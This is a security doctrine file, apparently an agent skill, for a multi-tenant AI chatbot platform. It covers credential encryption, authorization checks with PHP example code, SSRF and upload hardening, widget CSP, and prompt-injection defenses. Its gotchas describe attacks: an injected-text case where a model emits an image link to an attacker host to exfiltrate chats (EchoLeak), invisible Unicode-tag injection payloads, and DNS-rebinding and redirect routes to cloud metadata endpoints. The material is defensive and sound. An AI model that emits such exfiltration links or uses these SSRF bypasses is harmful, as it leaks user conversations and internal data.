---
name: kb-security-baseline
description: The security doctrine every KnowledgeBot AI service inherits — credential envelope encryption, the six checks every protected action performs, widget origin and CSP rules, layered prompt-injection defense, upload and crawler hardening, and audit redaction. Use whenever handling a provider API key, adding a protected endpoint, fetching a tenant-supplied URL, parsing an uploaded file, rendering model output, or writing an audit entry. It sets the rules; the mechanism skills implement them. Pairs with kb-tenancy-isolation (the scoping that makes least privilege real).
---

# KnowledgeBot Security Baseline

Doctrine, not a library: it constrains Laravel (control plane), FastAPI + Celery (data plane), the Preact widget, and the Next.js admin alike. Security-critical version floors — CPython **≥ 3.12.4** (below it `ipaddress` mis-classifies ranges, CVE-2024-4032, silently breaking the SSRF check), `docling` **≥ 2.94.0**, `lxml` **≥ 6.1.0**, `Pillow` **≥ 12.3.0**, `PyMuPDF` **≥ 1.26.7**, `dompurify` **≥ 3.4.13**; rationale per package in the references.
**Authoritative spec:** docs/13-security.md §18 (all), docs/03-functional-knowledge-sources.md §8.10 §8.13, docs/04-functional-channels-chat.md §8.20, docs/07-rag-query-pipeline.md §12.14, docs/17-testing-performance.md §22.5

## Non-negotiables

The nine principles of §18.1, stated as what breaks when they are ignored.

- **Deny by default, validate at the boundary.** Allow-lists for schemes, MIME types, file extensions, origins, content types, and destination IPs. Every deny-list in this system is a bug waiting for an encoding trick — see `references/ssrf-and-crawling.md` for the concrete bypass set.
- **No provider credential reaches a client, a log, an API response, or an audit detail.** One leaked key is the tenant's bill and the tenant's data. The widget, the mobile app, and the browser all talk to Laravel; they never hold a provider key and never call FastAPI (`kb-architecture-map`).
- **Uploaded and crawled content is hostile data, permanently.** It is parsed in a resource-capped sandbox, delimited as data in every prompt, and sanitized before it reaches a DOM. Treating it as trusted at *any* one of those three stages is enough to lose.
- **UI hiding is not authorization.** Every protected action runs all six server-side checks below. A hidden button is a discoverable endpoint.
- **Least privilege is enforced by tenant scoping, in code.** Every relational query, vector filter, storage path, and cache key carries the organization — the contract lives in `kb-tenancy-isolation`, and it is what makes "least privilege" mean anything here.
- **Destructive actions are auditable and secrets are not.** Deletions, credential changes, exports, and retention changes write an audit row; that row never contains the value that was changed.
- **Public and internal networks are separate.** Traefik exposes 80/443. PostgreSQL, Qdrant, Valkey, SeaweedFS, and FastAPI sit on an internal network with no route from the crawler's network.

## How we use it

### Owned elsewhere — cite, never redefine

| Topic | Owning skill |
|---|---|
| Sanctum tokens, cookies, CSRF, session lifetime mechanics | `laravel-sanctum-auth` |
| Policies, permission catalog, role wiring | `laravel-rbac-policies` |
| The tenant-scoping contract this skill leans on for least privilege | `kb-tenancy-isolation` |
| Crawl4AI configuration, JS rendering, sitemap and concurrency policy | `crawl4ai-crawler` |
| SAST, dependency and image CVE scanning, secret scanning, SBOM generation, model-artifact scanning, and the **licence gate** in CI | `security-scanning-toolchain` |
| Which HTTP status a rejected request gets, and what may appear in an error payload | `kb-error-taxonomy` |
| Keeping a decrypted key inside the adapter, and out of spans and exception messages | `kb-provider-adapter-contract` |
| Erasure completeness, retention holds, and the delete verification pass | `kb-deletion-and-verification` |

### Credentials (§18.2)

Envelope encryption: a per-credential data key encrypts the secret; the data key is wrapped by a KEK delivered through secret management or protected environment config, **never committed to Git and never in an image layer**. Storing `key_version` alongside the wrapped key makes KEK rotation a data change (rewrap the DEKs) instead of a schema migration. Decrypt only inside Laravel or the AI service, only for the duration of one provider call, and never into a variable that outlives the request. Expose a masked form (`sk-…4a91`) everywhere else, and offer the controlled connection-check action so nobody ever needs to read a key back to verify it.

**The credential does cross the internal wire, deliberately.** Laravel decrypts per request and sends the plaintext key as a **top-level `provider_credential` field** on the internal request body — never inside the configuration snapshot (docs/22 decision 1, resolved; wire shape in `kb-internal-api-contracts`, the `SecretStr` type in `pydantic-contracts`, the decrypt-and-attach step in `laravel-control-plane`). What was rejected matters more than what was chosen, because both alternatives look safer than they are:

- **FastAPI holding the KEK and receiving only a credential reference** requires FastAPI to read `provider_connections` out of PostgreSQL, breaking *Laravel owns the relational store* **and** *FastAPI never reads Laravel's tables* — two rules already decided (`kb-architecture-map`). It does not even shrink the blast radius: a compromised AI service holding the KEK yields plaintext keys anyway.
- **A separate audited fetch endpoint** adds a synchronous round trip in front of every generation, against docs/17 §23's 4-second first-token target, and merely relocates the same plaintext key onto a different request rather than removing it from the network.

Four constraints are what make sending it acceptable, and all four are load-bearing: it is **excluded from the configuration-snapshot hash**, so `configuration_version` does not move when a key rotates; it is `SecretStr`, so `repr()`, `str()` and `model_dump()` all yield `**********` and reading it takes an intentional, greppable `.get_secret_value()`; it is on the **never-forward list** — no SSE frame, no error envelope, no span attribute, no log field, no audit detail (non-negotiable 2 above); and `sha256(body)` sits inside the canonical signing string, so it is integrity-protected in transit over a private Compose network with no public route.

**Revisit condition — write it into the ADR, not into folklore.** The whole argument rests on Laravel and FastAPI sharing *one operator trust boundary*. If the AI service is ever deployed outside it — multi-tenant hosting, a third-party inference host, a shared cluster — the separate audited fetch endpoint becomes **mandatory** and its hot-path cost is simply accepted. Nothing else about the scheme survives that move, because nothing else about it was ever the reason.

### Sessions and authentication (§18.3)

Web sessions ride secure, `HttpOnly`, `SameSite=Lax` cookies with CSRF protection on every session-authenticated mutation; widget and mobile clients use short-lived bearer tokens instead of cookies, so there is no ambient authority to forge. Password endpoints are throttled **per account and per IP together** — per-IP alone lets a botnet spray one account, per-account alone lets one host enumerate the whole user table. Email verification gates organization creation; TOTP two-factor is offered and expected for any role that can rotate a credential or run an export. Sensitive actions re-authenticate rather than trusting session age. Mechanics: `laravel-sanctum-auth`.

### The six checks (§18.4) plus credential handling, in one place

```php
// services/core-api/app/Services/ProviderCredentialService.php
final class ProviderCredentialService
{
    public function __construct(
        private readonly ProviderCredentialRepositoryInterface $credentials,
        private readonly AuditLogger $audit,
    ) {}

    public function rotate(User $actor, int $credentialId, string $plaintextKey): ProviderCredential
    {
        // 1. Authenticated identity — auth:sanctum on the route (laravel-sanctum-auth).
        $credential = $this->credentials->findById($credentialId);

        abort_if($credential === null, 404);

        // 2. Organization membership + 4. entity ownership. Scope every lookup to the actor's org
        //    (kb-tenancy-isolation). Status code is kb-error-taxonomy's: wrong org is `authorization`
        //    → 403 on authenticated admin surfaces. On the *public* runtime and SDK surfaces return
        //    404 instead — there, a 403 on a foreign id confirms the row exists.
        abort_unless($credential->org_id === $actor->currentOrgId(), 403);

        // 3. Role / permission (laravel-rbac-policies).
        abort_unless($actor->can('providers.credentials.rotate', $credential), 403);

        // 5. Entity status — a disabled or pending credential is not rotatable.
        abort_unless($credential->status === CredentialStatus::Active, 409);

        // 6. Destructive-action policy — rotation breaks every live bot on this provider,
        //    so it needs a fresh authentication, not just a valid session (§18.3).
        $this->requireReauthenticationWithin($actor, minutes: 15);

        $credential = DB::transaction(function () use ($credential, $plaintextKey) {
            $dek = $this->keyVault->generateDataKey();          // per-credential data key
            return $this->credentials->replaceSecret(
                $credential,
                ciphertext:  $dek->encrypt($plaintextKey),
                wrappedKey:  $dek->wrapped(),                   // wrapped by the KEK, never the KEK
                keyVersion:  $dek->kekVersion(),                // rotation = rewrap, no migration
                maskedKey:   Str::mask($plaintextKey, '…', 3, -4),
            );
        });

        $this->audit->record($actor, 'provider_credential.rotated', [
            'credential_id' => $credential->id,
            'provider'      => $credential->provider,
            'key_version'   => $credential->key_version,
            // Identifies *which* key without being derivable back to it. Never the plaintext,
            // the ciphertext, the wrapped DEK, or a prefix of the key (§18.11).
            'key_fingerprint' => substr(hash_hmac('sha256', $plaintextKey, config('app.key')), 0, 16),
        ]);

        return $credential; // the API Resource serialises masked_key only
    }
}
```

Skipping check 5 or 6 is the common omission — 1 through 4 get caught in review because they are visible in the route file; status and destructive-action policy are not.

### The three untrusted-content intakes

Each has its own reference; read the one you are touching.

- **[references/ssrf-and-crawling.md](references/ssrf-and-crawling.md)** — the seven-step URL pipeline, resolved-IP pinning, per-hop redirect revalidation, metadata endpoints, response caps, and why network egress restriction is the only real backstop for a headless browser.
- **[references/file-upload-safety.md](references/file-upload-safety.md)** — extension/MIME allow-lists, decompression and XML bombs, polyglots and content sniffing, storage keys instead of filenames, parser sandboxing and timeouts, malware scanning.
- **[references/prompt-injection.md](references/prompt-injection.md)** — the layered mitigation, what genuinely helps versus what is theatre, invisible-Unicode and hidden-region stripping at ingestion, and the injection test corpus.

### The embedded widget (§18.5, §8.20)

An iframe app on our origin, embedded in customer sites by a loader script. **That origin is `<widget-domain>`, a separate registrable domain from `app.<domain>`, `chat.<domain>` and `api.<domain>` — `traefik-routing` owns the four hostnames and this skill only enforces the separation.** The reason is a hard one: the admin session cookie is scoped to the main domain, so anything of ours on the widget's eTLD+1 — the API above all — makes a widget iframe on a hostile customer page *same-site* with a real admin credential, and CHIPS cannot help because the cookie is not the widget's. **[references/widget-embedding-and-output.md](references/widget-embedding-and-output.md)** carries all eight controls in detail — origin matching, session tokens, signed user metadata, CORS, the CSP directive set, `frame-ancestors`, sandbox tokens, composite rate limits — plus the §18.9 rules for rendering model-generated Markdown safely. The shape: the public bot id is not a secret and grants nothing on its own; the host origin is validated against the bot's allow-list and echoed into a per-request `frame-ancestors`; the loader exchanges it for a short-lived, origin-bound chat session token; authenticated end-user metadata arrives as a token signed by the customer's *backend* with a shared secret, never as loader configuration; rate limits key on bot, origin, session, **and** IP together; and the iframe is sandboxed *with* `allow-same-origin` (see the gotcha below — dropping it yields an opaque origin and breaks every origin check we depend on) but without any `allow-top-navigation` variant.

### Privacy and audit (§18.10, §18.11)

Per-organization switches, defaulting to the privacy-preserving value: store conversations at all, retention window, admin review of conversations, anonymous metadata collection, feedback-comment storage, crawl-snapshot retention. Each has a working deletion path for users, conversations, sources, and organizations — and deletion means Qdrant points and SeaweedFS objects too, by stable identifier and verified afterwards (`kb-deletion-and-verification`). Audit login security events, user/role changes, credential changes, bot publish and config changes, source upload/disable/delete, crawl-schedule changes, exports, retention changes, and every destructive operation. Audit rows are append-only and outlive the record they describe.

## Gotchas

- **Your SSRF test suite passes and the crawler still reads `169.254.169.254`.** The client followed the redirect internally. `follow_redirects=True` (httpx) and `allow_redirects=True` (requests/aiohttp) resolve and fetch the `Location` *after* your validator ran. Disable them, loop over hops yourself, re-run the full check on each hop, cap at 5.
- **A URL validated as public connects to a private host.** Two DNS lookups — one to validate, one to connect — and the attacker's server answers them differently with TTL 0. Resolve once, validate every A **and** AAAA record, then connect to the validated IP literal with `Host` and TLS SNI still set to the hostname. Shipped in 2025 in MobSF and Craft CMS.
- **`if ($ip->is_private) reject;` lets CGNAT through.** `is_private` and `is_global` are not complements: `ipaddress.ip_address("100.64.1.1")` reports `is_private=False` *and* `is_global=False`. Use `not ip.is_global` as the sole rule, after unwrapping `.ipv4_mapped` — `::ffff:169.254.169.254` reports `is_link_local=False` because link-local is an IPv4 property.
- **A 200 KB `.xlsx` OOMs the parser container.** OOXML files are ZIP archives; the declared uncompressed size in the central directory is attacker-controlled. Cap the compression ratio, cap total declared size, *and* cap bytes while streaming the decompression — all three, because the first two are self-reported.
- **A file passes MIME sniffing and still executes in a browser.** Polyglots are valid in two formats at once, so `libmagic` is right and still wrong. The fix is not a better sniffer: serve every user-supplied file from a separate origin with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, and never from the app origin.
- **A chat answer silently exfiltrates the conversation.** Injected source text makes the model emit `![](https://attacker/?d=…)`; the renderer auto-loads it; the data is gone with no click. This is EchoLeak (CVE-2025-32711, CVSS 9.3, Microsoft 365 Copilot). Block it in the renderer and in `img-src`/`connect-src`, not in the prompt — Copilot's prompt-side classifier was bypassed.
- **Injection payloads that no reviewer can see.** The Unicode Tags block U+E0000–U+E007F maps one-to-one onto printable ASCII, renders as nothing anywhere, and tokenizes as instructions. Strip it plus the zero-width and bidi-override ranges at chunking time, so the stored chunk, the embedding, and the prompt all agree.
- **Every widget request arrives with `Origin: null` and the CORS check fails open or closed.** Someone dropped `allow-same-origin` from the iframe `sandbox` after reading the standard warning. The frame then has an *opaque* origin: `event.origin` is the string `"null"` (indistinguishable from any `data:` or sandboxed frame anywhere), `postMessage` can only be targeted with `"*"`, and storage throws. Keep the token — the `allow-scripts allow-same-origin` escape only exists when the framed document is same-origin **with the embedder**, which our cross-origin widget never is. The rule that survives: never frame this widget from a page on our own widget origin.
- **A "hardened" XML parser that is not.** lxml 5.0 disabled entity resolution for the normal parsers but left `iterparse()` and `ETCompatXMLParser()` at `resolve_entities=True` until 6.1.0 (CVE-2026-41066) — and `iterparse` is what streaming OOXML readers use. Separately, openpyxl's `iterparse` path falls back to stdlib `xml.etree` unless `defusedxml` is importable, so a dropped transitive dependency silently downgrades XXE hardening. Pin `defusedxml` directly and assert `openpyxl.DEFUSEDXML is True` at worker startup.
- **ClamAV reports OK on a file it never finished scanning.** `AlertExceedsMax` defaults to `no`, so anything past `MaxFileSize`/`MaxScanSize`/`MaxRecursion` returns a clean verdict indistinguishable from a real one; a stream past `StreamMaxLength` just closes the connection. Set `AlertExceedsMax yes`, fail closed on `Heuristics.Limits.Exceeded`, and treat a closed connection as an error.
- **An `origin` check passes for `ourdomain.com.evil.com`.** `startsWith`/`indexOf`/regex on `event.origin` in the `postMessage` handler. Compare the full string against the allow-list, and always pass an explicit `targetOrigin` when sending — never `*`.
- **A destructive endpoint is safe in the UI and open in the API.** The button was hidden, the policy was not written. Hidden UI is not one of the six checks.
- **A plaintext provider key is in the `retrieval_traces` table and in last month's playground records.** The credential was put *inside* the configuration snapshot instead of beside it. The snapshot exists to be persisted and replayed — that is its entire purpose — so every path that stores one for the playground, the retrieval trace, or a queued job stored the key with it, into columns no redaction fixture covers and no operator thinks of as sensitive. Nothing alerts, because nothing here is an error. It is also hashed into `configuration_version`, so a rotation silently changes cache keys and replay identity. Top-level field, excluded from the hash (`kb-internal-api-contracts`).
- **The audit row leaks the thing it was auditing.** `'details' => $request->all()` on a credential update writes the plaintext key into the audit table, which is append-only and long-lived by design. Allow-list the fields that go into `details`; fingerprint, never echo (§18.11).

## Official docs

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) — allow-lists, redirect disabling, network segregation.
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) — extension/MIME handling, storage, serving.
- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/llm-top-10/) — LLM01 prompt injection, LLM02 sensitive information disclosure.
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) and [`iframe` sandbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe#sandbox) — directive semantics and sandbox tokens.
- [MDN: `Window.postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) — the origin/targetOrigin security notes.
- [Laravel Encryption](https://laravel.com/docs/encryption) and [Key Rotation](https://laravel.com/docs/encryption#gracefully-rotating-encryption-keys) — the primitives under our envelope scheme.
- [Simon Willison, *The lethal trifecta*](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) — the framing to design agent capability against.

## Definition of done

- [ ] Every new protected route: all six checks present server-side, with a test per check; a foreign-org id returns `authorization` (`kb-error-taxonomy`) on admin surfaces and **404** on public/SDK surfaces
- [ ] `rg -i 'api_key|secret|password|token' storage/logs` and the audit `details` payloads are clean; a fixture with a known key asserts it never appears in either
- [ ] Credentials round-trip through envelope encryption; a KEK rotation test rewraps without a migration; the API Resource returns only `masked_key`
- [ ] The credential crosses the internal wire only as the top-level `provider_credential` field: a fixture key is asserted absent from the SSE capture, the error envelope, every exported span, every log line, the audit `details`, and every persisted snapshot (playground record, `retrieval_traces`, Celery job body); a rotation test asserts `X-KB-Config-Version` does not move
- [ ] Crawler fetch: scheme allow-list, credential rejection, all resolved records validated, IP pinned, redirects manual and capped, byte cap, timeout, content-type allow-list — with the §22.5 SSRF fixture set (loopback, RFC 1918, link-local, IPv4-mapped, CGNAT, `nip.io`, redirect-to-metadata) all refused
- [ ] Crawler container has no route to the internal data network; egress denies private ranges
- [ ] Upload path: extension + MIME allow-lists, size limit, compression-ratio and streamed-byte caps, random storage key, Pillow decoder allow-list + `n_frames` cap, Celery **hard** `time_limit` (not just `soft_time_limit`), parser container with no network namespace and a memory cap, malware-scan hook wired with `AlertExceedsMax yes`
- [ ] User-supplied files are served only from the separate file origin, with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`
- [ ] Ingestion strips U+E0000–U+E007F, zero-width and bidi ranges, and non-visible document regions; asserted against the stored chunk text
- [ ] Widget: served from `<widget-domain>`, asserted by a test comparing eTLD+1 against `app.`/`chat.`/`api.<domain>` (`traefik-routing`); origin allow-list enforced server-side, per-request `frame-ancestors` (never `*`), CSP with nonce + `'strict-dynamic'`, `object-src 'none'`, `base-uri 'none'` and constrained `img-src`/`connect-src`; `Vary: Origin` on every CORS response; exact-match `postMessage` origin **and** `event.source` checks
- [ ] Model output renders through markdown-it (`html: false`) → DOMPurify (array-form config, `RETURN_DOM_FRAGMENT`, no `IN_PLACE`) → `replaceChildren`; scheme allow-list on hrefs, `rel="noopener noreferrer nofollow"` on external links, remote images never auto-loaded
- [ ] §22.5 suite green: cross-tenant API and vector access, CORS/origin, SSRF payloads, malicious filenames, oversized files, prompt-injection samples, XSS in source content, secret redaction, rate limits
